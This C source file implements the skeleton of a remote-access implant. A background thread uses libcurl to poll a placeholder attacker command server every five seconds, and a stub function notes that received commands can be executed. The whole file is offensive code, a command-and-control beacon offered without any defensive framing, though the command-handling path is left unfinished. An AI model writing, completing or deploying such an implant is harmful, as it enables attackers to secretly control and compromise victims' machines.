#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <curl/curl.h>

#define ATTACKER_SERVER_URL "http://attacker_server_ip/command"

void* sendHttpRequest(void* arg) {
    while (1) {
        CURL* curl = curl_easy_init();
        if (curl) {
            // Configure the HTTP request
            curl_easy_setopt(curl, CURLOPT_URL, ATTACKER_SERVER_URL);
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, NULL);

            // Perform the HTTP GET request
            CURLcode res = curl_easy_perform(curl);

            // Check for errors
            if (res != CURLE_OK) {
                fprintf(stderr, "HTTP request failed: %s\n", curl_easy_strerror(res));
            }

            // Cleanup the libcurl handle
            curl_easy_cleanup(curl);

            // Sleep for 5 seconds
            sleep(5);
        }
    }
    return NULL;
}

void CommandParser(const char* command) {
    // Implement the CommandParser function to process the received command
    // You can execute the command or perform any desired actions here
    printf("Received command: %s\n", command);
}

int main() {
    // Initialize libcurl
    curl_global_init(CURL_GLOBAL_ALL);

    // Create a thread for sending HTTP requests
    pthread_t httpRequestThread;
    if (pthread_create(&httpRequestThread, NULL, sendHttpRequest, NULL) != 0) {
        perror("Failed to create thread");
        return 1;
    }

    // Main program logic
    while (1) {
        // Your main program logic here
        // This can run concurrently with the httpRequestThread

        // Sleep or perform other tasks
        sleep(1);
    }

    // Clean up and exit
    pthread_join(httpRequestThread, NULL);
    curl_global_cleanup();

    return 0;
}
